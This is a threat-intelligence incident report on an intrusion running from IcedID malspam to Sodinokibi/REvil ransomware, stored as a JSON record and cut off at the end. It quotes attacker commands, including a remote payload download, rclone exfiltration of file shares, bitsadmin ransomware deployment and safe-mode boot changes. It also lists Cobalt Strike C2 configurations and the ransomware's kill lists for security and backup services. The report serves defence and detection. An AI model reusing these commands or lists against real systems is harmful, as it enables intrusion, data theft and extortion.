{
    "id": "d94247e1-173e-4208-acfc-1fd6a6ad0b14",
    "created_at": "2023-01-12T15:09:35.671389Z",
    "updated_at": "2025-03-27T02:09:29.431026Z",
    "deleted_at": null,
    "sha1_hash": "fadc1ff58589130d2b7cc7a5ab72937451b17c59",
    "title": "2021-03-29 - Sodinokibi (aka REvil) Ransomware",
    "authors": "",
    "file_creation_date": "2022-05-28T18:03:40Z",
    "file_modification_date": "2022-05-28T18:03:40Z",
    "file_size": 2509009,
    "plain_text": "# Sodinokibi (aka REvil) Ransomware\n\n**[thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)**\n\n### Intro\n\n\nMarch 29, 2021\n\n\n#### Sodinokibi (aka REvil) has been one of the most prolific ransomware as a service (RaaS) groups over the last couple years. The ransomware family was purported to be behind the Travelex intrusion and current reports point to an attack against Acer for a reported $50\n\n\n-----\n\n#### million ransom demand.\n\n In March, we observed an intrusion which started with malicious spam that dropped IcedID (Bokbot) into the environment and subsequently allowed access to a group distributing Sodinokibi ransomware. During the intrusion the threat actors escalated privileges to Domain Administrator, exfiltrated data, and used Sodinokibi to ransom all domain joined systems.\n\n### Case Summary\n\n#### The IcedID trojan was first discovered in 2017 and currently operates as an initial access broker for several ransomware families. In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image.\n\n Persistence was setup using a scheduled task and discovery commands were initiated from the malware within minutes of execution. About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used through-out the intrusion. Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers. We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID. #ArtifactsMatter. It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.\n\n After compromising the Exchange server, the attackers moved to domain controllers and other systems within the environment using SMB and PowerShell Beacons executed via a remote service. The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique.\n\n Additional discovery was executed from the domain controller using AdFind and the Ping utility to test connections between the domain controller and other domain joined systems. After discovery was completed, credentials were dumped from lsass. After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.\n\n Three and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand.\n\n At the four hour mark, the threat actors began to move on to final objectives. They staged the ransomware executable on a domain controller and then used BITSAdmin to download it to each system in the domain After that the threat actors used RDP to open a cmd or\n\n\n-----\n\n#### PowerShell process to then execute the Sodinokibi ransomware using a particular flag - smode, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking. Encryption did not start immediately after reboot but required a user to log in, which in this case the threat actors completed by logging in after the reboot.\n\n Booting into Safe Mode with Networking blocked the startup of security tools and other management agents. Networking worked, but because services couldnâ€™t start, we were unable to remotely manage the systems using our normal tools. We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.\n\n On certain systems, ransomware was executed without the -smode flag, and on other systems a dll was executed via rundll32 to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed.\n\n About 4.5 hours after initial access, the threat actors had completed their mission of encrypting all domain joined systems. The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days. If we didnâ€™t pay within 7 days the price goes up to around $400k. The ransom is required to be paid in Monero instead of the usual Bitcoin. This may be in an effort to better shield the payments from tracing activity like those performed by Chainaylsis. The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful.\n\n### Services\n\n#### Our Threat Feed service picked up one of the two Cobalt Strike servers one day before this intrusion occurred and the other IP was added to the feed as soon as we recognized it.\n\n We also have artifacts available from this case such as ransomware samples (dll and exe), pcaps, memory captures, files, Kape packages and more, under our Security Researcher and Organization services.\n\n### Timeline\n\n\n-----\n\n-----\n\n### MITRE ATT&CK\n\n Initial Access\n\n#### Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.\n\n The delivery format was an xlsm file:\n\n Initial execution of the document writes a file to:\n```\nC:\\Users\\Public\\microsoft.security\n\n The Excel file called wmic to execute the file with regsrv32\nwmic.exe process call create 'regsvr32 -s C:\\Users\\Public\\microsoft.security'\n\n```\n\n-----\n\n#### This then made a network request to download a file from this URL\n```\nhttp://vpu03jivmm03qncgx.com/index.gif\n\n The GIF however was the IcedID malware.\n\n### Execution\n\n#### Once IcedID was downloaded to the host, the malware was executed using rundll32.exe\nrundll32.exe \"C:\\Users\\USERNAME\\AppData\\Local\\Temp\\skull-x64.dat\",update\n/i:\"DwarfWing\\license.dat\"\n\n After execution, the malware made contact with 161.35.109[.]168 which it continued to beacon to, throughout the intrusion.\n\n### Persistence\n\n#### IcedID setup persistence on the beach head host using a scheduled task.\nwewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n\n```\n\n-----\n\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A380B92917B3D}\n\n```\n\n-----\n\n#### The execution of the ransomware executable created a RunOnce key for persistence.\n```\nHKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\*AstraZeneca\n\n### Privilege Escalation\n\n#### After completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in the wuauclt.exe process executed several PowerShell functions for UAC bypasses including:\n\n UAC-TokenMagic\n\n Invoke-SluiBypass\n\n### Defense Evasion\n\n#### About one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.\n\n```\n\n-----\n\n#### Process injection was used multiple times across the environment using Cobalt Strike Beacons.\n\n Prior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.\n\n\n-----\n\n#### The GPO was named â€œnewâ€.\n\n### Credential Access\n\n#### Credentials were dumped on a server and domain controller using a Cobalt Strike Beacon.\n\n\n-----\n\n### Discovery\n\n#### Initial discovery by the IcedID malware occurred within minutes of execution:\n\n\n-----\n\n```\ncmd.exe /c chcp >&2\nWMIC.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct\nGet * /Format:List\nipconfig.exe ipconfig /all\nsysteminfo\nnet config workstation\nnltest /domain_trusts\nnltest /domain_trusts /all_trusts\nnet view /all /domain\nnet view /all\nnet.exe net group \"Domain Admins\" /domain\n\n#### A flurry of LDAP queries were seen coming from wuauclt.exe (Cobalt Strike) on the beachhead.\n\n```\n\n-----\n\n```\n DistinguishedName : CN Terminal Server License\nServers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\":\n\"member=*\" }\n\"DistinguishedName\": \"CN=RAS and IAS Servers,CN=Users,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Incoming Forest Trust\nBuilders,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\":\n\"member=*\" }\n\"DistinguishedName\": \"CN=Account Operators,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Cert Publishers,CN=Users,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Server Operators,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Storage Replica\nAdministrators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\",\n\"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Hyper-V Administrators,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Remote Management Users,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Access Control Assistance\nOperators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\",\n\"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=RDS Management Servers,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=RDS Endpoint Servers,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Event Log Readers,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=RDS Remote Access\nServers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\":\n\"member=*\" }\n\"DistinguishedName\": \"CN=Certificate Service DCOM\nAccess,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\":\n\"member=*\" }\n\"DistinguishedName\": \"CN=Performance Log Users,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Cryptographic Operators,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Distributed COM Users,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Network Configuration\nOperators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\",\n\"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Performance Monitor\nUsers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\":\n\"member=*\" }\n\"DistinguishedName\": \"CN=Remote Desktop Users,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Replicator,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Backup Operators,CN=Builtin,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Print Operators,CN=Builtin,DC=DomainName,DC=local\",\n\n```\n\n-----\n\n```\n ScopeOfSearch : Base, SearchFilter : member }\n\"DistinguishedName\": \"CN=Infra,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\",\n\"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security\nGroups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Security Administrator,OU=Microsoft Exchange Security\nGroups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Security Reader,OU=Microsoft Exchange Security\nGroups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Compliance Management,OU=Microsoft Exchange Security\nGroups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Discovery Management,OU=Microsoft Exchange Security\nGroups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Hygiene Management,OU=Microsoft Exchange Security\nGroups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Delegated Setup,OU=Microsoft Exchange Security\nGroups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Records Management,OU=Microsoft Exchange Security\nGroups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Help Desk,OU=Microsoft Exchange Security\nGroups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=UM Management,OU=Microsoft Exchange Security\nGroups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Public Folder Management,OU=Microsoft Exchange Security\nGroups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=View-Only Organization Management,OU=Microsoft Exchange\nSecurity Groups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\":\n\"member=*\" }\n\"DistinguishedName\": \"CN=DnsUpdateProxy,CN=Users,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Recipient Management,OU=Microsoft Exchange Security\nGroups,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Protected Users,CN=Users,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Cloneable Domain\nControllers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\",\n\"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Enterprise Key Admins,CN=Users,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Key Admins,CN=Users,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Domain Guests,CN=Users,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Enterprise Read-only Domain\nControllers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\",\n\"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Read-only Domain\nControllers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\",\n\"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Domain Computers,CN=Users,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Domain Users,CN=Users,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\"DistinguishedName\": \"CN=Domain Controllers,CN=Users,DC=DomainName,DC=local\",\n\"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" }\n\n```\n\n-----\n\n#### We believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.\n\n Once on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity.\n\n AdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name.\n\n\n-----\n\n```\ncmd.exe /C adfind.exe -f objectcategory=computer -csv name cn OperatingSystem\ndNSHostName > some.csv\n\n### Lateral Movement\n\n#### For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.\n\n```\n\n-----\n\n#### Cobalt Strike Beacon executables were transferred using SMB and executed via a remote service.\n\n\n-----\n\n#### On other systems, PowerShell was used with the same remote service execution.\n\n To facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment.\n\n### Collection\n\n#### The Rclone utility was used to collect information from file shares and to exfiltrate the data.\n```\n svchost.exe --config svchost.conf --progress --no-check-certificate copy\n\"\\\\ServerName\\C$\\ShareName\" ftp1:/DomainName/FILES/C/ShareName\n\n### Command and Control\n\n#### IcedID:\n\n cikawemoret34.space\n 206.189.10.247:80\n\n nomovee.website\n 161.35.109.168:443\n JA3: a0e9f5d64349fb13191bc781f81f42e1\n JA3s: ec74a5c51106f0419184d0dd08fb05bc\n\n```\n\n-----\n\n```\nCertificate:[e0:fc:e5:eb:fd:e7:da:0b:93:ac:dc:df:0d:e8:56:cc:7b:f2:58:43 ]\nNot Before: 2021/03/11 02:06:51\nNot After: 2022/03/11 02:06:51\nIssuer Org: Internet Widgits Pty Ltd\nSubject Common: localhost\nSubject Org: Internet Widgits Pty Ltd\nPublic Algorithm: rsaEncryption\n\n#### Cobalt Strike:\n\n 45.86.163.78:443 cloudmetric.online JA3:a0e9f5d64349fb13191bc781f81f42e1 JA3s: ae4edc6faf64d08308082ad26be60767\nCertificate:[b9:2c:48:71:1a:ba:eb:99:15:c4:0b:b0:31:ce:14:8e:a9:30:ac:d3 ]\nNot Before: 2021/02/27 06:45:42\nNot After: 2021/05/28 07:45:42\nIssuer Org: Let's Encrypt\nSubject Common: cloudmetric.online [cloudmetric.online]\nPublic Algorithm: rsaEncryption\n\n Cobalt Config:\n\n```\n\n-----\n\n```\n{\n\"x64\": {\n\"config\": {\n\"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\",\n\"Beacon Type\": \"0 (HTTP)\",\n\"Method 2\": \"POST\",\n\"Polling\": 48963,\n\"Jitter\": 24,\n\"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\",\n\"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\",\n\"Method 1\": \"GET\",\n\"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery3.2.2.min.js\",\n\"Port\": 80\n},\n\"sha256\": \"8d44894c09a2e30b40927f8951e01708d0a600813387c3c0872bcd6cb10a3e8c\",\n\"sha1\": \"deab6be62e9c9793f9874bbdec9ff0a3acb82ad8\",\n\"md5\": \"28ceee1f8f529a80bd0ff5e52240e404\",\n\"time\": 1615840900656.6\n},\n\"x86\": {\n\"config\": {\n\"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\",\n\"Beacon Type\": \"0 (HTTP)\",\n\"Method 2\": \"POST\",\n\"Polling\": 48963,\n\"Jitter\": 24,\n\"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\",\n\"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\",\n\"Method 1\": \"GET\",\n\"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery3.2.2.min.js\",\n\"Port\": 80\n},\n\"sha256\": \"11af3609884ad674a1c86f42ec27719094e935d357d73e574b75c787a0e8c0f1\",\n\"sha1\": \"a30de5ca8a107fd69c8885a975224ea8ff261002\",\n\"md5\": \"bbc6592c67d233640a9ca0d0d915003c\",\n\"time\": 1615840895189\n}\n}\n\n#### 195.189.99.74 smalleststores.com JA3: 72a589da586844d7f0818ce684948eea JA3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [14:f4:79:e3:fd:98:21:60:68:fd:1c:0a:e6:c6:f9:71:f4:ac:f9:df]\nNot Before: 2021/03/11 11:02:43\nNot After: 2021/06/09 12:02:43\nIssuer Org: Let's Encrypt\nSubject Common: smalleststores.com [smalleststores.com]\nPublic Algorithm: rsaEncryption\n\n Cobalt Config:\n\n```\n\n-----\n\n```\n{\n\"x86\": {\n\"config\": {\n\"Method 1\": \"GET\",\n\"Method 2\": \"GET\",\n\"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\",\n\"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\",\n\"Beacon Type\": \"8 (HTTPS)\",\n\"Polling\": 59713,\n\"Jitter\": 41,\n\"Port\": 443,\n\"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\",\n\"HTTP Method Path 2\": \"/OWA/\"\n},\n\"md5\": \"88365eb3d504f570f22d76f777ab2caf\",\n\"sha256\": \"4b25f708c506e0cc747344ee79ecda48d51f6c25c9cb45ceb420575458f56720\",\n\"sha1\": \"f42f2eea6cf88d30cfd6207182528be6ae2e504f\",\n\"time\": 1615846680369.8\n},\n\"x64\": {\n\"config\": {\n\"Method 1\": \"GET\",\n\"Method 2\": \"GET\",\n\"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\",\n\"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\",\n\"Beacon Type\": \"8 (HTTPS)\",\n\"Polling\": 59713,\n\"Jitter\": 41,\n\"Port\": 443,\n\"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\",\n\"HTTP Method Path 2\": \"/OWA/\"\n},\n\"md5\": \"27ca24a7f6d02539235d46e689e6e4ac\",\n\"sha256\": \"e35c31ba3e10f59ae7ea9154e2c0f6f832fcff22b959f65b607d6ba0879ab641\",\n\"sha1\": \"6885d84c1843c41ff8197d7ab0c8e42e20a7ecaa\",\n\"time\": 1615846684589\n}\n}\n\n### Exfiltration\n\n#### Data that was collected from the domain was exfiltrated to a remote server at:\n45.147.160.5:443\n\n```\n\n-----\n\n### Impact\n\n#### For the final actions, the threat actors dropped a ransomware executable on the domain controller in C:\\Windows and then used BITSAdmin to deploy the executable to remote systems.\n```\nC:\\Windows\\system32\\bitsadmin.exe /transfer debjob /download /priority normal\n\\\\DOMIANCONTROLLER\\c$\\windows\\DOMAINNAME.exe C:\\Windows\\DOMAINNAME.exe\n\n The -smode flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam\n\n```\n\n-----\n\n#### Not remember seeing these before in REvil ransomware samples. ðŸ¤” So basically the actors using REvil now can use it to reboot target machines into safe mode with networkingâ€¦@demonslay335 @VK_Intel pic.twitter.com/dLk4EirNFO\n\n â€” MalwareHunterTeam (@malwrhunterteam) March 18, 2021\n\n See below for -smode execution:\n\n The *franceisshit key was used to boot the machine out of Safe Mode upon restarting the machine.\n\n The systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen. About 10-20 seconds after logging in, all user files were encrypted and a ransom note was placed in numerous locations including the Desktop.\n\n\n-----\n\n#### Services were not able to be started, which led to collection issues, as normal agents did not start. This also included the startup of EDR and management agents.\n\n Weâ€™ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation.\n\n ðŸ†• #REvil v2.05\n -smode switch configures OS to boot into safe mode w/ networking via:\n (pre-Vista) bootcfg /raw /a /safeboot:network /id 1 or (Vista+) bcdedit /set {current} safeboot network\n configures auto-lognn via WinLogon ðŸ”‘ w/ 'DTrump4ever' password\n\n â€” R3MRUM (@R3MRUM) March 26, 2021\n\n After rebooting out of Safe Mode, you are left with the following desktop:\n\n\n-----\n\n#### On certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by rundll32 to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.\n```\nC:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\DomainName.dll,DllRegisterServer\n\n The threat actors asked for 200k in Monero. They were talked down 20-30% and could have been talked down more. Hereâ€™s a few screenshots from the website.\n\n```\n\n-----\n\n-----\n\n#### With the help of @hatching_io (https://tria.ge/) we were able to parse the config from the ransomware sample.\n```\nCampaign ID (sub): 7114\nnet: false\n\n```\n\n-----\n\n#### List of processes to kill (prc)\n\n\n-----\n\n```\noracle\nklnagent\nmydesktopqos\ninfopath\nBackupExtender\npowerpnt\noutlook\nBackupAgent\nSmc\nsql\nccSvcHst\nBackupUpdater\nRtvscan\nwinword\nkavfsscs\nocssd\nisqlplussvc\nvisio\nShadowProtectSvc\ntbirdconfig\nTSSchBkpService\ndbeng50\nccSetMgr\nagntsvc\nSage.NA.AT_AU.SysTray\ndbsnmp\nthebat\nonenote\nAmitiAvSrv\nwordpad\nmsaccess\navgadmsv\nthunderbird\nBackupMaint\nMicrosoft.exchange.store.worker.exe\nCarboniteUI\nexcel\nSPBBCSvc\nLogmeInBackupService\nencsvc\nocomm\nsqbcoreservice\nNSCTOP\nmydesktopservice\nkavfs\nkavfswp\nocautoupds\nmspub\nxfssvccon\nDLOAdminSvcu\nsynctime\nlmibackupvssservice\nfirefox\nsteam\ndlomaintsvcu\n\n```\n\n-----\n\n#### List of services to kill\n\n\n-----\n\n```\nTelemetryserver\n\"Sophos AutoUpdate Service\"\nsophos\nAltaro.Agent.exe\nmysqld\nMSSQL$MSGPMR\n\"SophosFIM\"\n\"Sophos Web Control Service\"\nSQLWriter\nsvcGenericHost\nAltiBack\n\"SQLServer Analysis Services (MSSQLSERVER)\"\nBackupExecAgentAccelerator\n\"StorageCraft ImageReady\"\nSQLTELEMETRY\nAzureADConnectAuthenticationAgent\nntrtscan\nds_notifier\nTeamViewer\n\"StorageCraft Raw Agent\"\n\"StorageCraft Shadow Copy Provider\"\nSQLTELEMETRY$SQLEXPRESS\nVeeamHvIntegrationSvc\nAltiCTProxy\nMsDtsServer130\nViprePPLSvc\nMcAfeeFramework\nMSSQL$QM\n\"swi_service\"\n\"ThreadLocker\"\nofcservice\nAUService\nsophossps\nAzureADConnectHealthSyncMonitor\nAltaro.OffsiteServer.UI.Service.exe\n\"SAVAdminService\"\nds_monitor\nALTIVRM\nSSASTELEMETRY\nTmCCSF\nMsDtsServer110\n\"Sophos MCS Client\"\nTMBMServer\nSBAMSvc\nmfewc\n\"Sophos System Protection Service\"\nMSSQLFDLauncher$TESTBACKUP02DEV\nVeeamDeploymentService\nmasvc\nbackup\nMSSQL$SQLEXPRESS\nAltiPhoneServ\nMSSQLServerOLAPService\nSSISTELEMETRY130\nVeeamEndpointBackupSvc\n\n```\n\n-----\n\n```\nmepocs\nAltaro.UI.Service.exe\n\"ds_agent\"\nHuntressUpdater\nMSSQLFDLauncher\n\"Sophos File Scanner Service\"\nSQLAgent$MSGPMR\nADSync\nKaseyaAgent\nReportServer\nMSSQLFDLauncher$SQLEXPRESS\nMSSQL$HPWJA\nKaseyaAgentEndpoint\nVeeamTransportSvc\n\"ds_monitor\"\nmfevtp\nMSSQLTESTBACKUP02DEV\nSQLTELEMETRY$MSGPMR\nThreadLocker\nMSSQLServerADHelper100\nveeam\ntmlisten\nAzureADConnectHealthSyncInsights\n\"swi_filter\"\nMsDtsServer120\nProtectedStorage\nVeeamDeploySvc\nmemtas\nds_agent\nVeeamMountSvc\nHuntressAgent\nSQLAgent$SQLEXPRESS\nbedbg\nMSSQLSERVER\n\"ofcservice\"\nVipreAAPSvc\n\"Sophos Endpoint Defense Service\"\nKACHIPS906995744173948\nDsSvc\nMSSQLLaunchpad$SQLEXPRESS\nmsseces\nmacmnsvc\nLTService\nCode42Service\nAltaro.HyperV.WAN.RemoteService.exe\nLTSvcMon\nMSSQL$SQLEXPRESSADV\n\"SAVService\"\nAltaro.OffsiteServer.Service.exe\n\"Sage 100cloud Advanced 2020 (9920)\"\nAltaro.SubAgent.exe\nmfemms\n\"TeamViewer\"\n\"SQLServer Reporting Services (MSSQLSERVER)\"\nVSS\n\n```\n\n-----\n\n```\nsql\nAltaro.SubAgent.N2.exe\n\"SQLServer Integration Services 12.0\"\nSQLSERVERAGENT\nvss\n\"Sophos Safestore Service\"\nklnagent\n\"Sage.NA.AT_AU.Service\"\nMBAMService\n\"Sophos Health Service\"\nSQLBrowser\nMySQL\n\"ProtectedStorage\"\n\"Sophos Clean Service\"\n\"Sage 100c Advanced 2017 (9917)\"\n\"SntpService\"\nVeeamNFSSvc\nKAVFS\nSQLEXPRESSADV\nKAENDCHIPS906995744173948\nsppsvc\nAmsp\npsqlWGE\nMicrosoft.exchange.store.worker.exe\nkavfsscs\n\"Amsp\"\nsqlservr\nAltaro.DedupService.exe\nsvc$\n\"ds_notifier\"\n\"Sophos Device Control Service\"\nAzureADConnectAgentUpdater\nAltiFTPUploader\n\"Sophos MCS Agent\"\n\n#### Triage sandbox run of the executable without smode:\n\n```\n\n-----\n\n### IOCs\n\n Network\n```\n45.86.163.78|80\n45.86.163.78|443\n45.86.163.78|8080\n195.189.99.74|80\n195.189.99.74|443\n195.189.99.74|8080\n206.189.10.247|80\n161.35.109.168|443\nsmalleststores.com\ncloudmetric.online\ncikawemoret34.space\nnomovee.website\n\n File\n\n```\n\n-----\n\n```\nskull 